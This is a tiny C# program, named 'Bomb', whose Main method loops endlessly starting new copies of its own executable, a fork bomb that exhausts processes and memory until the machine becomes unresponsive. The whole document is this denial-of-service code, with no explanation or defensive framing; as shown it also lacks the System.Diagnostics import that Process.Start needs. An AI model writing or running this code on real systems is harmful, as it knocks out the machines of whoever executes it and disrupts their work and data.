using System;
using System.Reflection;

namespace Bomb {
  class Bomb {
    static void Main()
    {
      while (true) Process.Start(Assembly.GetExecutingAssembly().Location);
    }
  }
}
